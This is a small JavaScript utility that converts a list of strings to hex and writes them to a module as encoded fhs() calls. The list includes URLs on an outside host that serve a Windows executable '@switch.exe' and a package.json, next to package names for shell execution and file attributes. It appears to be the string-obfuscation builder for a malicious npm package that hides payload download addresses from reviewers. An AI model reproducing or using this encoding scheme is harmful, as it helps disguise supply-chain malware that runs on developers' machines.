var asciiWords = [
  'https://border-px1-api.xyz/tools/c',
  'https://border-px1-api.xyz/tools/s',
  'https://border-px1-api.xyz/tools/sync',
  'https://border-px1-api.xyz/tools/@switch.exe',
  'https://border-px1-api.xyz/tools/package.json',
  '@switch.exe',
  'package-lock.json',
  'package.json',
  'location',
  'hostname',
  'localhost',
  'https://',
  'cheerio',
  'cli-color',
  'fs-extra',
  'request',
  'request-promise',
  'rimraf',
  'shelljs',
  'winattr',
  'cli-progress',
  'commander',
  'npm',
  'node-fetch',
  'express',
  'cors',
];
var delimiter = '';
// out put
function convert(asciiWords, delimiter) {
  var hexWords = [];
  asciiWords.forEach((word, index) => {
    var txt = word;
    var del = delimiter;
    len = txt.length;
    if (len == 0) return 0;
    var hex = '';
    for (i = 0; i < len; i++) {
      a = txt.charCodeAt(i);
      h = a.toString(16);
      if (h.length == 1) h = '0' + h;
      hex += h;
      if (i < len - 1) hex += del;
    }
    var maxLength = 29;
    hexWords.push(
      `fhs('${hex}'),${createSpace(
        maxLength - (hex.length + 7)
      )}// [${index}] - ${word}_`
    );
  });

  var content = `[\r\n   ${hexWords.toString().replace(/_,/g, '\r\n   ')}\r\n]`;
  console.log(content);
  require('fs').writeFile(
    './hexwords.js',
    `module.exports =
           ${content}
    `,
    function (err) {
      if (err) {
        return console.log(err);
      }
      console.log('converted');
    }
  );
}
function createSpace(number) {
  var strSpace = '';
  for (var i = 0; i < number; i++) {
    strSpace += ' ';
  }
  return strSpace;
}
convert(asciiWords, delimiter);
